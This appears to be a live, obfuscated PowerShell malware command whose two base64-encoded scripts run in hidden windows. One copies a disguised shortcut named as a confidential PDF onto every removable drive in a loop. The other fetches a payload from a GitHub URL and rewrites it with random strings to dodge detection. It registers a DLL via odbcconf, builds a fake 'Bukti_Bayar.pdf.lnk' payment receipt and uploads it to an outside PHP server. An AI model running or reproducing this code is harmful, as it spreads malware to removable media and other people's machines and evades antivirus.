start-process powershell.exe -Argument "-w 1 -enc dwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsAIAAkAGQAcgBpAHYAZQBwAGEAdABoACAAPQAgACgARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8ATABvAGcAaQBjAGEAbABEAGkAcwBrACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEQAcgBpAHYAZQBUAHkAcABlACAALQBlAHEAIAAyACAAfQApAC4ARABlAHYAaQBjAGUASQBEADsAIABpAGYAIAAoACQAZAByAGkAdgBlAHAAYQB0AGgAIAAtAGEAbgBkACAALQBuAG8AdAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAZAByAGkAdgBlAHAAYQB0AGgAXABEAE8ASwBVAE0ARQBOAF8AUABFAE4AVABJAE4ARwBfAFIAQQBIAEEAUwBJAEEALgBwAGQAZgAuAGwAbgBrACIAKQApACAAewAgAGMAbwBwAHkALQBpAHQAZQBtACAALQBQAGEAdABoACAAJABlAG4AdgA6AHQAbQBwAFwAQgB1AGsAdABpAF8AQgBhAHkAYQByAC4AcABkAGYALgBsAG4AawAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJABkAHIAaQB2AGUAcABhAHQAaABcAEQATwBLAFUATQBFAE4AXwBQAEUATgBUAEkATgBHAF8AUgBBAEgAQQBTAEkAQQAuAHAAZABmAC4AbABuAGsAIAB9ADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAzADAAMAAgAH0A" ; start-process powershell.exe -Argument "-w 1 iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2hpbGUgKChUZXN0LVBhdGggIiRlbnY6dG1wXGxua2NtZC5kbGwiKSAtYW5kIChUZXN0LVBhdGggIkM6XFByb2dyYW0gRmlsZXNcV2luZG93cyBEZWZlbmRlclxNc01wRW5nLmV4ZSIpKSB7DQpTZXQtTG9jYXRpb24gLVBhdGggJGVudjpUTVANCg0KJE5hbWFGaWxlPSJCdWt0aV9CYXlhciINCnJlbW92ZS1pdGVtICIkRU5WOlRNUFwkTmFtYUZpbGUucGRmLmxuayINCnJlbW92ZS1pdGVtICIkRU5WOlRNUFwkTmFtYUZpbGUuemlwIg0KDQpzdGFydC1zbGVlcCAxDQoNCiRpbnB1dEZpbGUgPSAiJGVudjpUTVBcUGF5bG9hZE1vcnBoLnR4dCINCg0KSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzF4M2svMS9yZWZzL2hlYWRzL21haW4vUGF5bG9hZE1vcnBoLnR4dCIgLU91dEZpbGUgJGlucHV0RmlsZQ0KDQokb3V0cHV0RmlsZSA9ICIkRU5WOlRNUFxQYXlsb2FkTW9ycGgyLnR4dCINCg0KDQpmdW5jdGlvbiBHZW5lcmF0ZS1SYW5kb21TdHJpbmcgew0KICAgIHBhcmFtICgkbGVuZ3RoKQ0KICAgICRjaGFycyA9ICcwMTIzNDU2Nzg5Jw0KICAgICRyYW5kb20gPSAtam9pbiAoKDEuLiRsZW5ndGgpIHwgRm9yRWFjaC1PYmplY3QgeyAkY2hhcnNbKEdldC1SYW5kb20gLU1pbmltdW0gMCAtTWF4aW11bSAkY2hhcnMuTGVuZ3RoKV0gfSkNCiAgICByZXR1cm4gJHJhbmRvbQ0KfQ0KDQoNCiRsaW5lcyA9IEdldC1Db250ZW50ICRpbnB1dEZpbGUNCg0KDQokYWxwaGFiZXQgPSBAKCdBJywgJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onKQ0KDQoNCiRwcm9jZXNzZWRMaW5lcyA9ICRsaW5lcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAkbGluZSA9ICRfDQoNCiAgICANCiAgICBmb3JlYWNoICgkbGV0dGVyIGluICRhbHBoYWJldCkgew0KICAgICAgICANCiAgICAgICAgJHJhbmRvbUxldHRlciA9ICRhbHBoYWJldCB8IEdldC1SYW5kb20NCg0KICAgICAgICANCiAgICAgICAgJGxpbmUgPSAkbGluZSAtcmVwbGFjZSAiJGxldHRlcnszMH0iLCAoJHJhbmRvbUxldHRlciAqIDMwKQ0KICAgIH0NCg0KDQogICAgDQogICAgMS4uOSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJHZhck5hbWUgPSAnVkFSJyArICRfDQogICAgICAgICRyYW5kb21MZW5ndGggPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gNg0KICAgICAgICAkcmFuZG9tU3RyaW5nID0gR2VuZXJhdGUtUmFuZG9tU3RyaW5nICRyYW5kb21MZW5ndGgNCg0KICAgICAgICANCiAgICAgICAgd2hpbGUgKCRwcm9jZXNzZWRMaW5lcyAtY29udGFpbnMgJHJhbmRvbVN0cmluZykgew0KICAgICAgICAgICAgJHJhbmRvbVN0cmluZyA9IEdlbmVyYXRlLVJhbmRvbVN0cmluZyAkcmFuZG9tTGVuZ3RoDQogICAgICAgIH0NCg0KICAgICAgICAkbGluZSA9ICRsaW5lIC1yZXBsYWNlICR2YXJOYW1lLCAkcmFuZG9tU3RyaW5nDQogICAgfQ0KDQogICAgDQogICAgMS4uNCB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJHZhck5hbWUgPSAnVkFSUicgKyAkXw0KICAgICAgICAkcmFuZG9tTGVuZ3RoID0gR2V0LVJhbmRvbSAtTWluaW11bSAyIC1NYXhpbXVtIDYNCiAgICAgICAgJHJhbmRvbVN0cmluZyA9IEdlbmVyYXRlLVJhbmRvbVN0cmluZyAkcmFuZG9tTGVuZ3RoDQoNCiAgICAgICAgDQogICAgICAgIHdoaWxlICgkcHJvY2Vzc2VkTGluZXMgLWNvbnRhaW5zICRyYW5kb21TdHJpbmcpIHsNCiAgICAgICAgICAgICRyYW5kb21TdHJpbmcgPSBHZW5lcmF0ZS1SYW5kb21TdHJpbmcgJHJhbmRvbUxlbmd0aA0KICAgICAgICB9DQoNCiAgICAgICAgJGxpbmUgPSAkbGluZSAtcmVwbGFjZSAkdmFyTmFtZSwgJHJhbmRvbVN0cmluZw0KICAgIH0NCg0KICAgIHJldHVybiAkbGluZQ0KfQ0KDQoNCiRwcm9jZXNzZWRMaW5lcyB8IFNldC1Db250ZW50ICRvdXRwdXRGaWxlDQoNCnN0YXJ0LXByb2Nlc3Mgb2RiY2NvbmYgLUFyZ3VtZW50ICJSRUdTVlIgbG5rY21kLmRsbCINCnN0YXJ0LXNsZWVwIDINCg0KW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygiJGVudjp0bXBcc2hvcnRjdXQubG5rIiwgW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCIkZW52OnRtcFxzaG9ydGN1dC5sbmsiKSArIFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygiQzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE1zTXBFbmcuZXhlIikgKQ0Kc3RhcnQtc2xlZXAgMg0KDQptb3ZlLWl0ZW0gIiRFTlY6VE1QXHNob3J0Y3V0LmxuayIgIiRFTlY6VE1QXCROYW1hRmlsZS5wZGYubG5rIg0KDQp0YXIgLWNmICIkRU5WOlRNUFwkTmFtYUZpbGUuemlwIiAtQyAiJEVOVjpUTVAiICIkTmFtYUZpbGUucGRmLmxuayINCg0Kc3RhcnQtc2xlZXAgMg0KDQokdT0iaHR0cHM6Ly9kc29zYXRhcmEuY28uaW4vbW9iaWxlL2FkbWluL2ltYWdlcy9rcmlkYV9pbWcvODg3NTUxNTVzZXJ2ZXIucGhwIjskZj0iJGVudjpUTVBcQnVrdGlfQmF5YXIuemlwIg0KJGI9Ii0tLS1XZWJLaXRGb3JtQm91bmRhcnkiK1tTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygiTiIpDQokaD0ibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9JGIiDQokYz0iLS0kYmByYG5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJmaWxlYCI7IGZpbGVuYW1lPWAiQnVrdGlfQmF5YXIuemlwYCJgcmBuQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW1gcmBuYHJgbiINCiRiZD1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRjKSsoR2V0LUNvbnRlbnQgJGYgLUVuY29kaW5nIEJ5dGUpK1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoImByYG4tLSRiLS1gcmBuIikNCiRyPVtTeXN0ZW0uTmV0Lkh0dHBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCR1KTskci5NZXRob2Q9IlBPU1QiOyRyLkNvbnRlbnRUeXBlPSRoOyRyLkNvbnRlbnRMZW5ndGg9JGJkLkxlbmd0aA0KJHM9JHIuR2V0UmVxdWVzdFN0cmVhbSgpOyRzLldyaXRlKCRiZCwwLCRiZC5MZW5ndGgpOyRzLkNsb3NlKCkNCltTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyXTo6bmV3KCRyLkdldFJlc3BvbnNlKCkuR2V0UmVzcG9uc2VTdHJlYW0oKSkuUmVhZFRvRW5kKCkNCg0KIDsgc3RhcnQtc2xlZXAgOTAwIH0gZXhpdA0K')))"
